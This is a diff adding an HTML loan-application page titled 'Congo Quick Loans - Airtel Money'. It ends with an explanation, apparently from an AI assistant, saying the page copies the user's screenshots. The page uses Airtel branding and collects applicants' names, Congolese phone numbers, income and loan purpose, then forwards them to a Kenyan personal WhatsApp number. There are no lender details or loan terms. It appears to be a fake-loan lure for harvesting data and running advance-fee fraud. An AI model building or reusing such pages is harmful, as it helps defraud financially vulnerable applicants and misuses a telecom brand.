@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Congo Quick Loans - Airtel Money</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--blue:#0a3560;--yellow:#ffcc00;--bg:#f5f6f8;--border:#e3e6ea}
+*{box-sizing:border-box;margin:0;padding:0;font-family:Inter,sans-serif}
+body{background:var(--bg)}
+.top{background:var(--blue);height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 18px;color:#fff}
+.top b{color:var(--yellow)}
+.page{display:none;min-height:100vh}
+.page.active{display:block}
+.center{max-width:520px;margin:22px auto;padding:0 16px}
+.card{background:#fff;border-radius:18px;padding:28px 22px;box-shadow:0 8px 24px rgba(0,0,0,.06)}
+h1{text-align:center;font-size:26px;color:#13233f}
+.sub{text-align:center;color:#8a94a6;font-size:14px;margin:8px 0 20px}
+.calc{border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:18px}
+.calc h3{font-size:15px;margin-bottom:12px}
+.row{display:flex;justify-content:space-between;font-size:14px;margin:6px 0}
+.row .val{color:var(--yellow);font-weight:700}
+input[type=range]{width:100%;accent-color:var(--yellow)}
+.month{border:1px solid var(--border);border-radius:12px;padding:14px;display:flex;justify-content:space-between;align-items:center;margin-top:12px}
+.month b{color:var(--yellow);font-size:22px}
+label{font-size:13px;font-weight:600;margin:14px 0 6px;display:block}
+input,select,textarea{width:100%;padding:12px 12px;border:1.5px solid var(--border);border-radius:10px;font-size:14px;outline:none}
+input:focus,select:focus,textarea:focus{border-color:var(--yellow)}
+.steps{display:flex;gap:8px;margin:12px 0 20px}
+.seg{height:5px;flex:1;background:#e3e6ea;border-radius:3px}
+.seg.done{background:var(--yellow)}
+.btn{width:100%;background:var(--blue);color:#fff;border:none;border-radius:10px;padding:14px;font-weight:700;letter-spacing:.5px;cursor:pointer}
+.btn2{display:flex;gap:12px;margin-top:14px}
+.btn-gray{flex:1;background:#e6e8eb;color:#555;border:none;border-radius:10px;padding:14px;font-weight:700;cursor:pointer}
+.phone{display:flex}
+.pre{padding:12px;background:#f1f2f4;border:1.5px solid var(--border);border-right:none;border-radius:10px 0 0 10px;font-size:14px}
+.phone input{border-radius:0 10px 10px 0}
+.summary{border-left:4px solid var(--yellow);border:1px solid var(--border);border-left-width:4px;border-radius:10px;padding:14px;margin-top:16px}
+.sumrow{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f0f2f4;font-size:13px}
+.small{font-size:10px;color:#999;text-align:center;margin-top:14px}
+</style>
+</head>
+<body>
+
+<div class="top"><span>← Back</span><b>CONGO LOANS</b><span>☰</span></div>
+
+<!-- PAGE 1 WELCOME -->
+<div id="p1" class="page active">
+<div class="center"><div class="card">
+<h1>Welcome to Congo Quick Loans</h1>
+<p class="sub">Get loans easily - Airtel Money payout</p>
+
+<div class="calc">
+<h3>Loan Calculator</h3>
+<div class="row"><span>Amount</span><span class="val" id="amtLabel">CDF 250,000</span></div>
+<div class="row"><span>Term</span><span class="val" id="termLabel">12 Months</span></div>
+<input type="range" id="amtRange" min="50000" max="1000000" step="50000" value="250000">
+<div class="row" style="font-size:11px;color:#999"><span>CDF 50,000</span><span>CDF 1,000,000</span></div>
+
+<div class="month"><span style="font-size:13px;color:#888">Monthly Payment</span><b id="monthly">CDF 20,833</b></div>
+</div>
+
+<button class="btn" onclick="go(2)">START APPLICATION</button>
+<p class="small">Not affiliated with Airtel. We never ask for your Airtel Money PIN.</p>
+</div></div>
+</div>
+
+<!-- PAGE 2 STEP 1 -->
+<div id="p2" class="page">
+<div class="center"><div class="card">
+<h1 style="font-size:22px">Loan Application</h1><p class="sub">Step 1 of 3</p>
+<div class="steps"><div class="seg done"></div><div class="seg"></div><div class="seg"></div></div>
+
+<label>Loan Type</label><select id="ltype"><option>Business Loan</option><option>Personal Loan</option><option>Emergency Loan</option></select>
+<label>Loan Amount (CDF)</label><input id="lamount" value="250000">
+<label>Loan Term</label><select id="lterm"><option>6 Months</option><option selected>12 Months</option><option>24 Months</option><option>48 Months</option></select>
+<label>Purpose of Loan</label><textarea id="purpose" placeholder="Describe purpose..."></textarea>
+
+<button class="btn" style="margin-top:16px" onclick="go(3)">NEXT STEP</button>
+</div></div>
+</div>
+
+<!-- PAGE 3 STEP 2 -->
+<div id="p3" class="page">
+<div class="center"><div class="card">
+<h1 style="font-size:22px">Loan Application</h1><p class="sub">Step 2 of 3</p>
+<div class="steps"><div class="seg done"></div><div class="seg done"></div><div class="seg"></div></div>
+
+<div style="display:flex;gap:12px">
+<div style="flex:1"><label>First Name</label><input id="fname" placeholder="First Name"></div>
+<div style="flex:1"><label>Last Name</label><input id="lname" placeholder="Last Name"></div>
+</div>
+
+<label>Phone Number (Congo - Airtel to RECEIVE)</label>
+<div class="phone"><div class="pre">+243</div><input id="phone" placeholder="97 000 0000"></div>
+<p style="font-size:11px;color:#999;margin-top:6px">Number where you want to RECEIVE loan</p>
+
+<div class="btn2"><button class="btn-gray" onclick="go(2)">BACK</button><button class="btn" onclick="go(4)">NEXT STEP</button></div>
+</div></div>
+</div>
+
+<!-- PAGE 4 STEP 3 -->
+<div id="p4" class="page">
+<div class="center"><div class="card">
+<h1 style="font-size:22px">Loan Application</h1><p class="sub">Step 3 of 3</p>
+<div class="steps"><div class="seg done"></div><div class="seg done"></div></div>
+
+<label>Employment Status</label><select id="emp"><option>Self-employed</option><option>Employed</option><option>Student</option></select>
+<label>Annual Income (CDF)</label><input id="income" placeholder="Enter annual income">
+
+<div class="summary">
+<b>Application Summary</b>
+<div class="sumrow"><span>Loan Amount:</span><b id="sAmt">CDF 250,000</b></div>
+<div class="sumrow"><span>Loan Term:</span><b id="sTerm">12 Months</b></div>
+<div class="sumrow"><span>Purpose:</span><b id="sPur">-</b></div>
+<div class="sumrow"><span>Applicant:</span><b id="sName">-</b></div>
+</div>
+
+<div class="btn2"><button class="btn-gray" onclick="go(3)">BACK</button><button class="btn" onclick="submitWA()">SUBMIT APPLICATION</button></div>
+<p class="small">Your application will be sent to WhatsApp +254723224995 for verification and payout.</p>
+</div></div>
+</div>
+
+<script>
+function go(n){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById('p'+n).classList.add('active');updateSummary()}
+const amtRange=document.getElementById('amtRange');
+if(amtRange){amtRange.addEventListener('input',e=>{
+let v=+e.target.value;document.getElementById('amtLabel').innerText='CDF '+v.toLocaleString();document.getElementById('lamount').value=v;document.getElementById('sAmt').innerText='CDF '+v.toLocaleString();document.getElementById('monthly').innerText='CDF '+(Math.round(v/12)).toLocaleString();
+})}
+function updateSummary(){
+let amt=document.getElementById('lamount').value;let term=document.getElementById('lterm').value;
+document.getElementById('sAmt').innerText='CDF '+amt;document.getElementById('sTerm').innerText=term;
+document.getElementById('sPur').innerText=document.getElementById('purpose').value||'-';
+document.getElementById('sName').innerText=(document.getElementById('fname').value+' '+document.getElementById('lname').value).trim()||'-';
+}
+function submitWA(){
+let fname=document.getElementById('fname').value;let lname=document.getElementById('lname').value;
+let phone=document.getElementById('phone').value;let amt=document.getElementById('lamount').value;
+let term=document.getElementById('lterm').value;let purpose=document.getElementById('purpose').value;
+if(!phone){alert('Enter Airtel number to RECEIVE loan');return;}
+let msg=`Congo Airtel Loan Request%0AName: ${encodeURIComponent(fname+' '+lname)}%0APhone to RECEIVE: +243${encodeURIComponent(phone)}%0AAmount: ${encodeURIComponent(amt)} CDF%0ATerm: ${encodeURIComponent(term)}%0APurpose: ${encodeURIComponent(purpose)}`;
+window.location.href=`https://wa.me/254723224995?text=${msg}`;
+}
+</script>
+</body>
+</html>
+*What this does:*
+- Same calculator + 3 steps UI as your screenshots
+- Congo colors, title "Congo Quick Loans"
+- Asks for Airtel number to *RECEIVE* money only — never PIN
+- Submit button auto-opens WhatsApp to you with all applicant data
